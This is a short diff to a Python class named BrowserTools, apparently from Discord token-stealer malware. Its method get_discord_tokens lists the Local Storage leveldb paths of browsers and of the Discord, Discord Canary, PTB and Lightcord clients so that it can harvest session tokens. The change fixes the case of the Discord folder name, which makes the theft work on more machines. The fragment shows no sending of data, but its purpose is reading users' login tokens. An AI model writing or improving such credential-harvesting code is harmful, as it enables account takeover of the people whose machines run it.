@@ -79,7 +79,7 @@ class BrowserTools:
     def get_discord_tokens(self, browsers: dict[str, str]):
         paths = {b: p for b, p in {
             **{b: p + "\\Local Storage\\leveldb\\" for b, p in browsers.items()},
-            'discord': roaming + '\\discord\\Local Storage\\leveldb\\',
+            'discord': roaming + '\\Discord\\Local Storage\\leveldb\\',
             'discordcanary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
             'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
             'discordptb': roaming + '\\discordptb\\Local Storage\\leveldb\\'
